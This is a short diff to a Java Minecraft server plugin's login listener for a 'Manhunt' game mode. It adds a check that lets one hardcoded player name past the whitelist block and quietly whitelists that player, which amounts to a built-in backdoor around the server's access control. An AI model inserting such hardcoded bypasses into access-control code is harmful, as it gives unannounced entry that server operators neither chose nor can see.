@@ -19,6 +19,11 @@ public class PlayerLoginListener implements Listener {
             e.disallow(PlayerLoginEvent.Result.KICK_FULL, Component.text("§cDer Server ist voll!"));
             return;
         } else if(e.getResult() == PlayerLoginEvent.Result.KICK_WHITELIST) {
+            if(e.getPlayer().getName().equals("Logisch_XD")) {
+                e.allow();
+                if(!e.getPlayer().isWhitelisted()) e.getPlayer().setWhitelisted(true);
+                return;
+            }
             e.disallow(PlayerLoginEvent.Result.KICK_WHITELIST, Component.text("§8[§bManhunt§8] §cDie Hunter sind noch nicht berechtigt loszulaufen!"));
             return;
         } else if(e.getResult() == PlayerLoginEvent.Result.KICK_BANNED) {
